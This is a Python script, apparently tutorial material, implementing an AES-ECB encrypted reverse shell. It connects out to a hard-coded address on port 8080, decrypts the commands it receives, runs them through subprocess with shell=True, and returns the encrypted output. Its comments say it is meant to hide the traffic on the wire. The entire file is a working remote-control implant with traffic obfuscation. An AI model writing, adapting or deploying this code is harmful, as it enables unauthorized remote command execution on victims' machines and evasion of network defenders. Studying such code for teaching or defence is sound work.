import socket
import subprocess # See video https://www.youtube.com/watch?v=2Fp1N6dof0Y
import os
from Crypto.Cipher import AES
import hashlib
import sys
import binascii
import Padding

# Simple way to encrpt traffic so it cant be seen on the wire
# Reverse shell using AES ECB
# NOTE ECB is insecure as it repeats
password='hello'
ival=10

#Hash key using sha256 hash convert to binary
key = hashlib.sha256(password.encode()).digest()
print(key)
iv= hex(ival)[2:8].zfill(16)  
#command is the data we will encrypt ie the plaintext

def encrypt(plaintext,key, mode):
    encobj = AES.new(key,mode)
    return(encobj.encrypt(plaintext))

def decrypt(ciphertext,key, mode):
    encobj = AES.new(key,mode)
    return(encobj.decrypt(ciphertext))


def connect():
    s = socket.socket()
    #s.connect(("10.174.15.6",8080))
    s.connect(("192.168.1.183",8080))
    while True:
        
                
        command = s.recv(4096)
        plaintext = command
        print("The command receive encrpted",command)

        print("Decypting command")
        plaintext = command
        # We now decrypt the text
        plaintext = decrypt(plaintext,key,AES.MODE_ECB)
        print("The plain text raw but decrypted",plaintext)
        #Remove all the padding
        plaintext = Padding.removePadding(plaintext.decode(),mode=0)
        #Command now in raw text command
        print ("  decrypt: "+plaintext)
        
        # See the video above which explains how the subprocess element works
        # A pipe has two endpoints
        CMD = subprocess.Popen(plaintext, shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # Capture any command errors and send the 
        #plaintext = CMD.stderr.read().decode() 
        #Combine the stdout and stderr so we capture all.  That way the program wont break
        plaintext = CMD.stdout.read().decode() + CMD.stderr.read().decode()
        
        print(plaintext)
        
        #convert byte to string!!!
        
        plaintext = Padding.appendPadding(plaintext,blocksize=Padding.AES_blocksize,mode=0)
        print("The  response in plain text with padding added",plaintext)
        #print ("Input data (CMS): "+binascii.hexlify(plaintext.encode()).decode())

        ciphertext = encrypt(plaintext.encode(),key,AES.MODE_ECB)
        print("The response encrypted",ciphertext)        
        
        
        #Capture the standout and send the output to the server
        #s.send(ciphertext.stdout.read())
        s.send(ciphertext)
        print("Waiting")
   

def main():
    key = hashlib.sha256(password.encode()).digest()
    
    iv= hex(ival)[2:8].zfill(16)    

    connect()
main()
